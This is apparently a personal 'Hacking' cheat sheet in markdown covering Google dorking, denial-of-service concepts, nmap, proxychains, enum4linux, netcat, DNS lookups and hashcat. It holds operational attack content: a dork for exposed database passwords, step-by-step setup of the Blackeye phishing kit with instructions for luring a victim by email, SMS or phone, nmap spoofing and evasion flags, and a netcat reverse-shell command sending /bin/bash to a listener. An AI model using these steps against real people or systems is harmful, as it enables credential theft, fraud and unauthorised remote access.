
# Hacking

Basics:

## Recon (FootPrinting): Gathering Public Information

- Framwork: https://osintframework.com/

- Google Hacking

    - Google Hacking utilizes the Gathering Public Information. Google Hacking is a sub-category of Recon
    - `key:value`, `key: "value"`: operators are key-value pairs that can be used in google search to narrow down the search results
    - `-key`: the dash "-" right before the key represets the "NOT" actions meaning It won't include it if the value matches
    - `intitle: "title"` searchs for pages with the specific title
        
        ```
        intitle: "webcamxp 5"
        ```
        ```
        intitle: "login"
        ```
    - `filetype:<ext> "<keyword>"` searchs for files with the specific type and looks for `<keyword>` in them

        - `filetype:env "DB_PASSWORD"` unrestricted Database Passwords

    - `site:<domain>` narrows down search results to the specific site only
    - `inurl:<keyword>`: if the URL contains "<keyword>"
    - `intext:<keyword>`: if the body of the webpage contains "<keyword>"
    - https://www.exploit-db.com/google-hacking-database


## Denial of Service 
    
A Denial of Service (DoS) attack is a malicious attempt to disrupt the normal functioning of a targeted server, service, or network by overwhelming it with a flood of illegitimate traffic. The primary goal of a DoS attack is to make the targeted system or network unavailable to its intended users, causing disruption or complete shutdown of services.
    
Distributed Denial of Service (DDoS): In a DDoS attack, the attacker uses multiple compromised devices or systems, often referred to as a botnet, to orchestrate the attack. This makes it more challenging to mitigate the attack since the traffic comes from multiple sources, often geographically distributed.

Types of DoS Attacks
        
- Network DoS (Denial of Service): Network DoS attacks target the network infrastructure itself, aiming to overwhelm network devices, such as routers, switches, or firewalls, with a flood of traffic.
           
    - How it works: Attackers flood the target network with an excessive volume of data packets, exploiting vulnerabilities in network protocols or overloading network bandwidth.
           
    - Examples: Common types of Network DoS attacks include UDP flood, ICMP flood, SYN flood, and amplification attacks (such as DNS amplification or NTP amplification attacks).
           
    - Impact: Network DoS attacks can disrupt network connectivity, making it difficult or impossible for legitimate users to access network resources or services.
        
- Application DoS (Denial of Service): Application DoS attacks target specific applications or services running on a server, exploiting vulnerabilities in the application layer protocols or application software.
           
    - How it works: Attackers send a flood of requests to the target application, consuming server resources such as CPU, memory, or disk I/O, and causing the application to become unresponsive to legitimate users.
           
    - Examples: Common types of Application DoS attacks include HTTP flood, Slowloris, and application-level protocol attacks targeting vulnerabilities in web servers, databases, or other application services.
           
    - Impact: Application DoS attacks can disrupt the availability of web services, online applications, or databases, leading to downtime, financial losses, and damage to the organization's reputation.
        
- Operational Technology (OT) DoS:
           
    - Definition: Operational Technology (OT) refers to the hardware and software systems used to monitor and control physical processes, such as industrial control systems (ICS), SCADA (Supervisory Control and Data Acquisition) systems, or smart grid infrastructure.
           
    - How it works: OT DoS attacks target critical infrastructure components, such as programmable logic controllers (PLCs) or industrial network devices, aiming to disrupt industrial processes or essential services.
           
    - Examples: OT DoS attacks can exploit vulnerabilities in industrial protocols, firmware, or software used in manufacturing, energy production, transportation, or other industrial sectors.
           
    - Impact: OT DoS attacks can have severe consequences, including production outages, equipment damage, environmental hazards, or safety risks, leading to significant financial losses and potential threats to public safety.

Social Engineering:

## Social Engineering Toolkit (SET)

## Phising

Black Eye:

- Step: 1, Setup
        
    - Installing git (Skip if you have Git Installed):

        ```bash
        sudo apt install git
        ```

    - Clone repository

        ```bash
        git clone https://github.com/8L4NK/blackeye
        ```

    - Sign Up for Ngrok (Necessary for Hosting)
        
        ```bash
        https://dashboard.ngrok.com/signup
        ```

    - run the script:

        ```bash
        sudo bash ./blackeye/blackeye.sh
        ```

- Step: 2, Tricking The Vitim in to Clicking The Link

    - Via Email

    - Via SMS (Smishing)

    - Phone Call (Vishing)

- Types of Phising Attempts:

    - Mass Phishing (Attempting to Phish an Group, Organizations etc)
    - Spear-Phishing (Attempting to Phish a Specific Person)

        (Attempting to phish a Very Important / Powerful / Influential Person is called Whaling)

Network:

## Nmap

- Nmap (Network Mapper) is an Open-Source Project used to scan Networks for vulnerabilities and other things.

- Installation

        Debian Based:

        $ sudo apt install nmap

    - Source: https://nmap.org/download.html

- Syntax:

        $ nmap <ScanType> <Options> <target>

- Target:

    - Can pass hostnames, IP addresses, networks, etc.
            Ex: scanme.nmap.org, google.com/24, 192.168.0.1; 10.0.0-255.1-254
    - `-iL <inputfilename>`:                   Input from list of hosts/networks
    - `-iR <num hosts>`:                       Choose random targets
    - `--exclude <host1[,host2][,host3],...>`: Exclude hosts/networks
    - `--excludefile <exclude_file>`:          Exclude list from file
    
    Scan Type:

- Host Discovery

    - `-sL` List Scan:                    simply list targets to scan (doesn't sends any TCP packets)
    - `-sn` Ping Scan:                    disable port scan
    - `-Pn` Treat all hosts as online:    skip host discovery
    - `-PS/PA/PU/PY[portlist]`            TCP SYN, TCP ACK, UDP or SCTP discovery to given ports
    - `-PE/PP/PM`                         ICMP echo, timestamp, and netmask request discovery probes
    - `-PO[protocol list]`                IP Protocol Ping
    - `-n/-R`                             Never do DNS resolution/Always resolve [default: sometimes]
    - `--dns-servers <serv1[,serv2],...>` Specify custom DNS servers
    - `--system-dns`                      Use OS's DNS resolver
    - `--traceroute`                      Trace hop path to each host
    
- Scan

    - `-sS/sT/sA/sW/sM`:               TCP SYN / Connect() / ACK / Window / Maimon scans
    - `-sU`:                           UDP Scan
    - `-sN/sF/sX`:                     TCP Null, FIN, and Xmas scans
    - `--scanflags <flags>`:           Customize TCP scan flags
    - `-sI <zombie host[:probeport]>`: Idle scan
    - `-sY/sZ`:                        SCTP INIT/COOKIE-ECHO scans
    - `-sO`:                           IP protocol scan
    - `-b <FTP relay host>`:           FTP bounce scan

    Options:

- Ports and Scan Order:
        
    - `-p range`:        Only scan specified ports
            
            Ex: -p 22; -p 1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

    - `--exclude-ports <port ranges>`: Exclude the specified ports from scanning
    - `-F`:                            Fast mode - Scan fewer ports than the default scan
    - `-r`:                            Scan ports sequentially - don't randomize
    - `--top-ports <number>`:          Scan <number> most common ports
    - `--port-ratio <ratio>`:          Scan ports more common than <ratio>

- Service/Version:

    - `-sV`:                         Probe open ports to determine service/version info
    - `--version-intensity <level>`: Set from 0 (light) to 9 (try all probes)
    - `--version-light`:             Limit to most likely probes (intensity 2)
    - `--version-all`:               Try every single probe (intensity 9)
    - `--version-trace`:             Show detailed version scan activity (for debugging)

- OS detection:

    - `-O`:             Enable OS detection
    - `--osscan-limit`: Limit OS detection to promising targets
    - `--osscan-guess`: Guess OS more aggressively

- Performance:

    - Options which take <time> are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).

    - `-T<0-5>`:                                                      Set timing template (higher is faster)
    - `--min-hostgroup/max-hostgroup <size>`:                         Parallel host scan group sizes
    - `--min-parallelism/max-parallelism <numprobes>`:                Probe parallelization
    - `--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>`: Specifies probe round trip time.
    - `--max-retries <tries>`:                                        Caps number of port scan probe retransmissions.
    - `--host-timeout <time>`:                                        Give up on target after this long
    - `--scan-delay/--max-scan-delay <time>`:                         Adjust delay between probes
    - `--min-rate <number>`:                                          Send packets no slower than <number> per second
    - `--max-rate <number>`:                                          Send packets no faster than <number> per second

- Firewall/IDS Evasion and Spoofing:

    - `-f; --mtu <val>`:                              fragment packets (optionally w/given MTU)
    - `-D <decoy1,decoy2[,ME],...>`:                  Cloak a scan with decoys
    - `-S <IP_Address>`:                              Spoof source address
    - `-e <iface>`:                                   Use specified interface
    - `-g/--source-port <portnum>`:                   Use given port number
    - `--proxies <url1,[url2],...>`:                  Relay connections through HTTP/SOCKS4 proxies
    - `--data <hex string>`:                          Append a custom payload to sent packets
    - `--data-string <string>`:                       Append a custom ASCII string to sent packets
    - `--data-length <num>`:                          Append random data to sent packets
    - `--ip-options <options>`:                       Send packets with specified ip options
    - `--ttl <val>`:                                  Set IP time-to-live field
    - `--spoof-mac <mac address/prefix/vendor name>`: Spoof your MAC address
    - `--badsum`:                                     Send packets with a bogus TCP/UDP/SCTP checksum

    (xii) SCRIPT SCAN:

    - `-sC`:                               equivalent to --script=default
    - `--script <name>`:                   runs one of the automated hacking scripts listed at https://nmap.org/nsedoc/scripts/

        ``` bash
        $ sudo nmap --script vuln 192.168.1.1
        ```

    - `--script=<LuaScripts>`:            `<Lua scripts>` is a comma separated list of directories, script-files or script-categories
    - `--script-args=<n1=v1,[n2=v2,...]>`: provide arguments to scripts
    - `--script-args-file=filename`:       provide NSE script args in a file
    - `--script-trace`:                    Show all data sent and received
    - `--script-updatedb`:                 Update the script database.
    - `--script-help=<Lua scripts>`:       Show help about scripts.

    - Some Scripts:

        - `vuln`: A General Script for Scanning for Vunerabilites
        - `smb-enum-users.nse`: Gathers Information about The user on the Target machine which uses SMB Protocol (445 for Microsoft-DS)

    (xiii) OUTPUT:

    - `-oN/-oX/-oS/-oG <file>`:  Output scan in normal, XML, s|rIpt kIddi3, and Grepable format, respectively, to the given filename.
    - `-oA <basename>`:          Output in the three major formats at once
    - `-v`:                      Increase verbosity level (use -vv or more for greater effect)
    - `-d`:                      Increase debugging level (use -dd or more for greater effect)
    - `--reason`:                Display the reason a port is in a particular state
    - `--open`:                  Only show open (or possibly open) ports
    - `--packet-trace`:          Show all packets sent and received
    - `--iflist`:                Print host interfaces and routes (for debugging)
    - `--append-output`:         Append to rather than clobber specified output files
    - `--resume <filename>`:     Resume an aborted scan
    - `--noninteractive`:        Disable runtime interactions via keyboard
    - `--stylesheet <path/URL>`: XSL stylesheet to transform XML output to HTML
    - `--webxml`:                Reference stylesheet from Nmap.Org for more portable XML
        - `--no-stylesheet`:         Prevent associating of XSL stylesheet w/XML output

    Other:

- Misc

    - `-6`:                   Enable IPv6 scanning
    - `-A`:                   Enable OS detection, version detection, script scanning, and traceroute
    - `--datadir <dirname>`:  Specify custom Nmap data file location
    - `--send-eth/--send-ip`: Send using raw ethernet frames or IP packets
    - `--privileged`:         Assume that the user is fully privileged
    - `--unprivileged`:       Assume the user lacks raw socket privileges
    - `-V`:                   Print version number
    - `-h`:                   Print this help summary page.

- Examples:-

    ```bash
    $ nmap -v -A scanme.nmap.org
    ```
    ``` bash
    $ nmap -v -sn 192.168.0.0/16 10.0.0.0/8
    ```
    ``` bash
    $ nmap -v -iR 10000 -Pn -p 80
    ```
## Proxy Chaining

- Proxy chains are sequences of proxy servers through which internet traffic is routed to enhance privacy and anonymity. Each server in the chain forwards the data to the next, masking the original source IP address. This layered approach makes it harder to trace the user's online activity.

- Setup

    - Locate the `proxychains` config file on your system

        ``` bash
        $ locate proxychains
        /etc/proxychains4.conf
        /etc/alternatives/proxychains
        /etc/alternatives/proxychains.1.gz
        /usr/bin/proxychains
        ...
        ```
        - the first line of the output will be the file

    - Edit The file:

            $ nano /etc/proxychains4.conf

        Configuration:

    - Pick one of 3 Proxy Options

        - dynamic_chain: Chains all the Proxy's Together to make the set inbetween you and the Internet (unless one of the is not available then it just skips it over)

        - strict_chain: (For Later...)

        - random_chain: picks a random proxy from the proxy list and lets it sit in-between you and the internet (It doesn't chain proxies Together but keeps them guessing)

        - `proxychains4.conf`:
            ```bash
            dynamic_chain
            #strict_chain
            #random_chain
            ```

            (add a Hashtag "#" as the first character of that line disables it)

    - `proxy_dns` Proxies your DNS request (Enabled by default). `proxychains4.conf`:

        ``` bash
        dynamic_chain
        #strict_chain
        #random_chain
        proxy_dns
        ```

    - Adding Proxies

        - under `[Proxylist]` add proxies with the following format:
            ```
            type IP Port username? password?
            ```

        - type can be on of these: "http", "https", "socks4", "socks5" and "raw"

        - `IP` will be the IP address of the Proxy

        - <username?> and <password?> are only required if the proxy requires them otherwise they are not needed
            
            - `proxychains4.conf`:
            
            ``` bash
            dynamic_chain
            #strict_chain
            #random_chain

            proxy_dns

            remote_dns_subnet 224
            tcp_read_time_out 15000
            tcp_connect_time_out 8000

            [Proxylist]
            socks4 121.175.250.164 3128
            socks4 88.255.64.83 1080
            socks4 200.108.190.110 9800
            http 109.230.72.236 8080
            ```

            (VI) TOR the Onion Router: add `socks4 127.0.0.1 9050` to the list of Proxylist to use the Tor Onion Router (requires Tor Service to be enabled)

    - Finalized config:

            ``` bash
            dynamic_chain
            #strict_chain
            #random_chain

            proxy_dns

            remote_dns_subnet 224
            tcp_read_time_out 15000
            tcp_connect_time_out 8000

            [Proxylist]
            socks4 121.175.250.164 3128
            socks4 88.255.64.83 1080
            socks4 200.108.190.110 9800
            http 109.230.72.236 8080
            ```

- Using Proxychains
        
    - `proxychains <cmd>` runs the specified command with the proxychains

        ``` bash
        $ proxychains firefox google.com
        $ proxychains ping google.com
        $ proxychains nmap -sT -p 80,443 192.168.0.1
        ```

- How to find proxy server?

    - Just google it: https://www.google.com/search?q=free+proxy+server+list

    - Too Lazy to Search? here:

        - (Non-Associated)
        - https://geonode.com/free-proxy-list
        - https://netnut.io/free-proxy-list/
        - https://spys.one/

## SMB

- Enum4Linux (SMB)

    - Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com). Some additional features such as RID cycling have also been added for convenience.

    - Gathers Information About The Target Machine Running `SMB` protocol

    - Syntax:
        
        ``` bash
        $ enum4linux Options IP
        ```

    - Options:

        - `-U` get userlist
        - `-M` get machine list*
        - `-S` get sharelist
        - `-P` get password policy information
        - `-d` be detailed, applies to -U and -S
        - `-u user` specify username to use (default "")              
        - `-p pass` specify password to use (default "")   
            - `-G`        get group and member list

    - The following options from enum.exe aren't implemented: -L, -N, -D, -f

    - Additional options:

        - `-a` Do all simple enumeration (-U -S -G -P -r -o -n -i). This option is enabled if you don't provide any other options.
        - `-h` Display this help message and exit
        - `-r` enumerate users via RID cycling
        - `-R range` RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
        - `-l` Get some (limited) info via LDAP 389/TCP (for DCs only)
        - `-s file`   brute force guessing for share names            
        - `-k user` User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none) Used to get sid with "lookupsid known_username" Use commas to try several users: "-k admin,user1,user2"
            - `-K n`      Keep searching RIDs until n consective RIDs don't correspond to a username.  Impies RID range ends at 999999. Useful against DCs.
        - `-o` Get OS information
        - `-i` Get printer information
        - `-w wrkg` Specify workgroup manually (usually found automatically)
        - `-n` Do an nmblookup (similar to nbtstat)
        - `-v` Verbose.  Shows full commands being run (net, rpcclient, etc.)
        - `-A` Aggressive. Do write checks on shares etc

    - About
            
        - RID cycling should extract a list of users from Windows (or Samba) hosts which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network access: Allow anonymous SID/Name translation" enabled (XP, 2003).
        - NB: Samba servers often seem to have RIDs in the range 3000-3050.
        - Dependancy info: You will need to have the samba package installed as this script is basically just a wrapper around rpcclient, net, nmblookup and smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ is required to get Password Policy info.

## Reverse Proxy

- NetCat
        
    - NetCat known as TCP/IP swiss army knife

    - Syntax:
        
        ```bash
        # Attacker:
        $ nc Options Hostname Port[s] Ports..

            # Target:
        $ nc -l -p Port Options Hostname Port
        ```
    - Flags:

        - `-c string`    specify shell commands to exec after connect (use with caution).  The string is passed to /bin/sh -c for execution.  See the -e option if you don't have a working /bin/sh (Note that POSIX-conformant system must have one).
        - `-e filename`  specify filename to exec after connect (use with caution).  See the -c option for enhanced functionality.
        - `-g gateway`   source-routing hop point[s], up to 8
        - `-G num`       source-routing pointer: 4, 8, 12, ...
        - `-i secs`      delay interval for lines sent, ports scanned
        - `-l `         listen mode, for inbound connects
        - `-n `         numeric-only IP addresses, no DNS
        - `-h `         display help
        - `-o file`      hex dump of traffic
        - `-p port`      local port number (port numbers can be individual or ranges: lo-hi [inclusive])
        - `-q seconds`   after EOF on stdin, wait the specified number of seconds and then quit. If seconds is negative, wait forever.
        - `-b `         allow UDP broadcasts
        - `-r `         randomize local and remote ports
        - `-s addr`      local source address
        - `-t`           enable telnet negotiation
        - `-u`           UDP mode
        - `-v`           verbose [use twice to be more verbose]
        - `-w secs`      timeout for connects and final net reads
        - `-C`           Send CRLF as line-ending
        - `-z`           zero-I/O mode [used for scanning]
        - `-T type`      set TOS flag (type may be one of "Minimize-Delay", "Maximize-Throughput", "Maximize-Reliability", or "Minimize-Cost".)

    - Examples:

        ``` bash
        # Start Listening:
        $ nc -lnvp 87 -s 192.168.1.32

        # Target:
        $ nc -c /bin/bash 192.168.1.32 87
        ```

## DNS

- Host

    - DNS Discovery

    - Syntax:

            $ host <options> <Domain/IP>

        - provide a Domain for DNS Lookup
        - provide an IP for Reverse DNS (maybe be blocked)
        
    - `-a`: is equivalent to -v -t ANY
    - `-A`: is like -a but omits RRSIG, NSEC, NSEC3
    - `-c`: specifies query class for non-IN data
    - `-C`: compares SOA records on authoritative nameservers
    - `-d`: is equivalent to -v
    - `-l`: lists all hosts in a domain, using AXFR
    - `-m <flag>`: set memory debugging flag (trace|record|usage)
    - `-N <nDots>`: changes the number of dots allowed before root lookup is done
    - `-p <port>`: specifies the port on the server to query
    - `-r`: disables recursive processing
    - `-R <number>`: specifies number of retries for UDP packets
        - `-s`: a SERVFAIL response should stop query
    - `-t <type>`: specifies the query type

        - `ns`: Name Server
        - `mx`: Mail Server

    - `-T`: enables TCP/IP mode
    - `-U`: enables UDP mode
    - `-v`: enables verbose output
    - `-V`: print version number and exit
    - `-w`: specifies to wait forever for a reply
    - `-W <wait>`: specifies how long to wait for a reply
    - `-4`: use IPv4 query transport only
    - `-6`: use IPv6 query transport only

- Ns Lookup
        
    - nslookup: is a program to query Internet domain name servers. nslookup has two modes: interactive and non-interactive. Interactive mode allows the user to query name servers for information about various hosts and domains
       or to print a list of hosts in a domain.  Non-interactive mode prints just the name and requested information for a host or domain.
    - Syntax:

        ```   
        $ nslookup Options Name Server
        ```

    - Arguments
            
        - Interactive mode is entered in the following cases:

            - when no arguments are given (the default name server is used);
            - when the first argument is a hyphen (-) and the second argument is the host name or Internet address of a name server.

        - Non-interactive mode is used when the name or Internet address of the host to be looked up is given as the first argument. The optional second argument specifies the host name or address of a name server.

        - Options can also be specified on the command line if they precede the arguments and are prefixed with a hyphen. For example, to change the default query type to host information, with an initial timeout of 10 seconds, type:

            ```bash
            $ nslookup -query=hinfo  -timeout=10
            ```

        - `-version`: print the version number.
            
    - Iteractive Mode Commands:
        
        - `host Server`: looks up information for host using the current default server or using server, if specified. If host is an Internet address and the query type is A or PTR, the name of the host is returned. If host is a name and does not have a trailing period (.), the search list is used to qualify the name. To look up a host not in the current domain, append a period to the name.

        - `<serverDomain>, <lserver domain>`: These  commands  change the default server to domain; lserver uses the initial server to look up information about domain, while server uses the current default server. If an authoritative answer cannot be found, the names of servers that might have the answer are returned.

        - `exit`   This command exits the program.

        - `set Keyword=Value`: This command is used to change state information that affects the lookups. Valid keywords are:
            
            Keywords:
            - `all`    This keyword prints the current values of the frequently used options to set. Information about the current default server and host is also printed.
            - `class=Value`
                        This keyword changes the query class to one of:

                - `IN`     the Internet class
                - `CH`     the Chaos class
                - `HS`     the Hesiod class
                - `ANY`    wildcard

                - The class specifies the protocol group of the information. The default is IN; the abbreviation for this keyword is cl.

            - `nodebug`
                        This keyword turns on or off the display of the full response packet, and any intermediate response packets, when searching. The default for this keyword is  nodebug;  the  abbreviation  for  this  keyword  is
                        [no]deb.
            - `nod2:`           This keyword turns debugging mode on or off. This displays more about what nslookup is doing. The default is nod2.
            - `domain=name`:    This keyword sets the search list to name.
            - `nosearch`:       If  the lookup request contains at least one period, but does not end with a trailing period, this keyword appends the domain names in the domain search lis`t to the request until an answer is received. The de‐`: fault is search.
            - `port=value`:     This keyword changes the default TCP/UDP name server port to value from its default, port 53. The abbreviation for this keyword is po.
            - `querytype=value | type=value`: This keyword changes the type of the information query to value. The defaults are A and then AAAA; the abbreviations for these key`words are q and ty.`: Please note that it is only possible to specify one query type. Only the default behavior looks up both when an alternative is not specified.
            - `norecurse`:      This keyword tells the name server to query other servers if it does not have the information. The default is recurse; the abbreviation for this keyword is [no]rec.
            - `ndots=number`:   This keyword sets the number of dots (label separators) in a domain that disables searching. Absolute names always stop searching.
            - `retry=number`:   This keyword sets the number of retries to number.
            - `timeout=number`: This keyword changes the initial timeout interval to wait for a reply to number, in seconds.
            - `novc`:           This keyword indicates that a virtual circuit should always be used when sending requests to the server.  novc is the default.
            - `nofail`:         This keyword tries the next nameserver if a nameserver responds with SERVFAIL or a referral (nofail), or terminates the query (fail) on such a response. The default is nofail.

- Dig

Brute Force:

## Passwords

- Cracking Hashes

    - Hashcat

        - About
                
            - hashcat - Advanced CPU-based password recovery utility
            - Hashcat is the world’s fastest CPU-based password recovery tool.
            - While it's not as fast as its GPU counterpart oclHashcat, large lists can be easily split in half with a good dictionary and a bit of knowledge of the command switches.
            - Hashcat is the self-proclaimed world’s fastest CPU-based password recovery tool, Examples of hashcat supported hashing algorithms are Microsoft LM Hashes, MD4, MD5, SHA-family, Unix Crypt formats, MySQL, Cisco PIX.

        - Syntax:

            ```bash    
            $ hashcat <options> <hash (String or File)> <worldlist>
            ```

        - Options

            General:

            - `-h`, `--help`: Show summary of options.
            - `-V`, `--version`: Show version of program.

                Important:

            - `-a`, `--attack-mode=NUM`: Attack-mode, see references below
            - `-m`, `--hash-type=NUM`: Hash-type, see references below

                Options:

            - `-b`, `--benchmark`: Run benchmark
            - `-c`, `--segment-size=NUM`: Size in MB to cache from the wordfile
            - `-d`, `--opencl-devices=STR`: OpenCL devices to use, separated with commas
            - `-D`, `--opencl-device-types=STR`: OpenCL device-types to use, separated with commas
            - `-g`, `--generate-rules=NUM`: Generate NUM random rules
            - `-I`, `--opencl-info`: Show info about detected OpenCL platforms/devices
            - `-j`, `--rule-left RULE`: Single rule applied to each word from left wordlist
            - `-k`, `--rule-right RULE`: Single rule applied to each word from right wordlist
            - `-l`, `--limit=NUM`: Limit X words from the start + skipped words
            - `-n`, `--kernel-accel=NUM`: Manual workload tuning, set outerloop step size to X
            - `-o`, `--outfile=FILE`: Define outfile for recovered hash
            - `-O`, `--optimized-kernel-enable`: Enable optimized kernels (limits password length)
            - `-p`, `--separator=CHAR`: Define separator char for hashlists/outfile
            - `-r`, `--rules-file=FILE`: Rules-file use: -r 1.rule
            - `-s`, `--skip=NUM`: Skip X words from the start
            - `-S`, `--slow-candidates`: Enable slower (but advanced) candidate generators
            - `-t`, `--markov-threshold`: Threshold X when to stop accepting new markov-chains
            - `-T`, `--kernel-threads=NUM`: Manual workload tuning, set thread count to X
            - `-u`, `--kernel-loops=NUM`: Manual workload tuning, set innerloop step size to X
            - `-w`, `--workload-profile=NUM`: Enable a specific workload profile, see pool below
            - `-z`, `--brain-client`: Enable brain client, activates -S

            Character Set:

            - `-1, --custom-charset1=CS`: User-defined charsets example --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef -1 mycharset.hcchr : sets charset ?1 to chars contained in file
            - `-2, --custom-charset2=CS`: User-defined charsets example --custom-charset2=?dabcdef : sets charset ?2 to 0123456789abcdef -2 mycharset.hcchr : sets charset ?2 to chars con$
            - `-3, --custom-charset3=CS`: User-defined charsets example --custom-charset3=?dabcdef : sets charset ?3 to 0123456789abcdef -3 mycharset.hcchr : sets charset ?3 to chars con$
            - `-4, --custom-charset4=CS`: User-defined charsets example --custom-charset4=?dabcdef : sets charset ?4 to 0123456789abcdef -4 mycharset.hcchr : sets charset ?4 to chars con$
                
            All Options:

            - `--quiet`: Suppress output
            - `--force`: Ignore warnings
            - `--stdin-timeout-abort`: Abort if there is no input from stdin for X seconds
            - `--machine-readable`: Display the status view in a machine-readable format
            - `--keep-guessing`: Keep guessing the hash after it has been cracked
            - `--self-test-disable`: Disable self-test functionality on startup
            - `--loopback`: Add new plains to induct directory
            - `--hex-salt`: Assume salt is given in hex
            - `--hex-charset`: Assume charset is given in hex
            - `--hex-wordlist`: Assume words in wordlist are given in hex
            - `--runtime=NUM`: Abort session after NUM seconds of runtime
            - `--status`: Enable automatic update of the status-screen
            - `--status-timer=NUM`: Seconds between status-screen update
            - `--outfile-format=NUM`: Define outfile-format for recovered hash, see references below
            - `--outfile-autohex-disable`: Disable the use of $HEX[] in output plains
            - `--show` Show cracked passwords only (see --username)
            - `--left` Show uncracked passwords only (see --username)
            - `--username`: Enable ignoring of usernames in hashfile (Recommended: also use --show)
            - `--remove`: Enable remove of hash once it is cracked
            - `--stdout`: Stdout mode
            - `--potfile-disable`: Do not write potfile
            - `--debug-mode=NUM`: Defines the debug mode (hybrid only by using rules), see references below
            - `--debug-file=FILE`: Output file for debugging rules (see --debug-mode)
            - `--generate-rules-func-min=NUM`: Force NUM functions per random rule min
            - `--generate-rules-func-max=NUM`: Force NUM functions per random rule max
            - `--generate-rules-seed=NUM`: Force RNG seed to NUM
            - `--increment`: Enable increment mode
            - `--increment-min=NUM`: Start incrementing at NUM
            - `--increment-max=NUM`: Stop incrementing at NUM
            - `--markov-hcstat2`: Specify hcstat2 file to use
            - `--markov-disable`: Disables markov-chains, emulates classic brute-force
            - `--markov-classic`: Enables classic markov-chains, no per-position
            - `--session=STR`: Define specific session name
            - `--restore`: Restore session from --session
            - `--restore-disable`: Do not write restore file
            - `--restore-file-path=FILE`: Specific path to restore file
            - `--outfile-check-timer=NUM`: Sets seconds between outfile checks to X
            - `--wordlist-autohex-disable`: Disable the conversion of $HEX[] from the wordlist
            - `--remove-timer=NUM`: Update input hash file each X seconds
            - `--potfile-path=FILE`: Specific path to potfile
            - `--encoding-from=CODE`: Force internal wordlist encoding from X
            - `--encoding-to=CODE`: Force internal wordlist encoding to X
            - `--induction-dir=DIR`: Specify the induction directory to use for loopback
            - `--outfile-check-dir=DIR`: Specify the outfile directory to monitor for plains
            - `--logfile-disable`: Disable the logfile
            - `--hccapx-message-pair=NUM`: Load only message pairs from hccapx matching X
            - `--nonce-error-corrections=NUM`: The BF size range to replace AP's nonce last bytes
            - `--keyboard-layout-mapping=FILE`: Keyboard layout mapping table for special hash-modes
            - `--truecrypt-keyfiles=FILE`: Keyfiles to use, separated with commas
            - `--veracrypt-keyfiles=FILE`: Keyfiles to use, separated with commas
            - `--veracrypt-pim=NUM`: VeraCrypt personal iterations multiplier
            - `--benchmark-all`: Run benchmark of all hash-modes
            - `--speed-only`: Return expected speed of the attack, then quit
            - `--progress-only`: Return ideal progress step size and time to process
            - `--bitmap-min=NUM`: Sets minimum bits allowed for bitmaps to X
            - `--bitmap-max=NUM`: Sets maximum bits allowed for bitmaps to X
            - `--cpu-affinity=STR`: Locks to CPU devices, separated with commas
            - `--example-hashes`: Show an example hash for each hash-mode
            - `--opencl-platforms=STR`: OpenCL platforms to use, separated with commas
            - `--opencl-vector-width=NUM`: Manually override OpenCL vector-width to X
            - `--spin-damp=NUM`: Use CPU for device synchronization, in percent
            - `--hwmon-disable`: Disable temperature and fanspeed reads and triggers
            - `--hwmon-temp-abort=NUM`: Abort if temperature reaches X degrees Celsius
            - `--scrypt-tmto=NUM`: Manually override TMTO value for scrypt to X
            - `--keyspace`: Show keyspace base:mod values and quit
            - `--brain-server`: Enable brain server
            - `--brain-client-features=NUM`: Define brain client features, see below
            - `--brain-host=STR`: Brain server host (IP or domain)
            - `--brain-port=PORT`: Brain server port
            - `--brain-password=STR`: Brain server authentication password
            - `--brain-session=HEX`: Overrides automatically calculated brain session
            - `--brain-session-whitelist=HEX`: Allow given sessions only, separated with commas

        - Permutation attack-mode options Outfile formats (`-o`)
            
            | Value | Description                           |
            | ----- | ------------------------------------- |
            | `1`   | hash[:salt]                           |
            | `2`   | plain                                 |
            | `3`   | hash[:salt]:plain                     |
            | `4`   | hex_plain                             |
            | `5`   | hash[:salt]:hex_plain                 |
            | `6`   | plain:hex_plain                       |
            | `7`   | hash[:salt]:plain:hex_plain           |
            | `8`   | crackpos                              |
            | `9`   | hash[:salt]:crack_pos                 |
            | `10`  | plain:crack_pos                       |
            | `11`  | hash[:salt]:plain:crack_pos           |
            | `12`  | hex_plain:crack_pos                   |
            | `13`  | hash[:salt]:hex_plain:crack_pos       |
            | `14`  | plain:hex_plain:crack_pos             |
            | `15`  | hash[:salt]:plain:hex_plain:crack_pos |

        - Debug mode output formats (for hybrid mode only, by using rules)

            | Value | Description                                         |
            | ----- | --------------------------------------------------- |
            | `1`   | save finding rule                                   |
            | `2`   | save original word                                  |
            | `3`   | save original word and finding rule                 |
            | `4`   | save original word, finding rule and modified plain |

        - Built-in charsets

            | Value | Description                       |
            | ----- | --------------------------------- |
            | `?l`  | abcdefghijklmnopqrstuvwxyz        |
            | `?u`  | ABCDEFGHIJKLMNOPQRSTUVWXYZ        |
            | `?d`  | 0123456789                        |
            | `?h`  | 0123456789abcdef                  |
            | `?H`  | 0123456789ABCDEF                  |
            | `?s`  |  !"#$%&'()*+,-./:;<=>?@[]^_`{|}~  |
            | `?a`  | ?l?u?d?s                          |
            | `?b`  | 0x00 - 0xff                       |


        - Attack mode (`-a`)
        
            | Value | Description               |
            | ----- | ------------------------- |
            | `0`   | Straight                  |
            | `1`   | Combination               |
            | `3`   | Brute-force               |
            | `6`   | Hybrid Wordlist + Mask    |
            | `7`   | Hybrid Mask + Wordlist    |

        - Hash types (`-m`)

            | Value   | Description                                         |
            | ------- | --------------------------------------------------- |
            | `0`     | MD5                                                 |
            | `10`    | md5($pass.$salt)                                    |
            | `20`    | md5($salt.$pass)                                    |
            | `30`    | md5(unicode($pass).$salt)                           |
            | `40`    | md5($salt.unicode($pass))                           |
            | `50`    | HMAC-MD5 (key = $pass)                              |
            | `60`    | HMAC-MD5 (key = $salt)                              |
            | `100`   | SHA1                                                |
            | `110`   | sha1($pass.$salt)                                   |
            | `120`   | sha1($salt.$pass)                                   |
            | `130`   | sha1(unicode($pass).$salt)                          |
            | `140`   | sha1($salt.unicode($pass))                          |
            | `150`   | HMAC-SHA1 (key = $pass)                             |
            | `160`   | HMAC-SHA1 (key = $salt)                             |
            | `200`   | MySQL323                                            |
            | `300`   | MySQL4.1/MySQL5                                     |
